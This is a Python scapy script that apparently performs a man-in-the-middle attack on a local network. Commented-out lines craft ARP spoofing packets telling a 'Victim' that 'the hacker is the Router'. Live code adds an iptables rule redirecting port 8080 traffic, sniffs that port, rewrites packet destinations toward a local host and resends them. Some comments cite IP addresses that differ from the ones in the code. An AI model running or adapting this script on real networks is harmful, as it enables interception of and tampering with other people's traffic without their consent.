#!/usr/bin/python

import signal,sys
from scapy.all import *


# while True:
# packet = ARP(op=1, pdst="192.168.200.63", hwaddr="e8:1c:ba:32:48:fb", psrc="192.168.200.1")
# send(packet) #Packet telling the Victim (with ip address 192.168.111.157) that the hacker is the Router.

# packet = ARP(op=1, pdst="192.168.200.1", psrc="192.168.200.63")
# send(packet) #Packet telling the Router (with ip address 192.168.111.2) that the hacker is the Victim.

# ip=IP(src="192.168.200.1",dst='192.168.200.63')/Ether()/TCP(flags='S', dport=(1, 1024))


import base64
import re
import os
import subprocess

def handler(signum, frame):
    print("clearing ip tables...")
    out=subprocess.check_output("iptables -t nat -L --line-numbers", shell=True)
    # print(out.decode("utf-8"))
    for val in out.decode("utf-8").split("\n"):
        if re.search("8888",val):
            print(val)
            os.system("sudo iptables -t nat -D PREROUTING "+val[0])
    sys.exit()

signal.signal(signal.SIGINT, handler)

os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 8080 -j REDIRECT   --to-port 8888") 

def http_header(packet):
    http_packet=str(packet)
    if re.search("dst=199\.34\.21\.253",repr(packet)):
        print("\n\n\n\n---------------------------------------------------------------------------------------------------")
        print(repr(packet))
        packet[IP].dst = '192.168.200.63'
        print(repr(packet))
        print(sr1(packet, verbose=True,timeout=1))
    return packet.sprintf("{Raw:%Raw.load%}\n")

# sniff(iface='wlp2s0', prn=http_header, filter="tcp and (port 80 or port 8080)")

sniff(iface='enp2s0', prn=http_header, filter="tcp port 8080")

# try:
#     sniff(iface='enp2s0', prn=http_header, filter="tcp port 8080")
# except KeyboardInterrupt:
#     print("clearing ip tables...")
#     out=subprocess.check_output("iptables -t nat -L --line-numbers", shell=True)
#     # print(out.decode("utf-8"))
#     for val in out.decode("utf-8").split("\n"):
#         if re.search("8888",val):
#             print(val)
#             os.system("sudo iptables -t nat -D PREROUTING "+val[0])

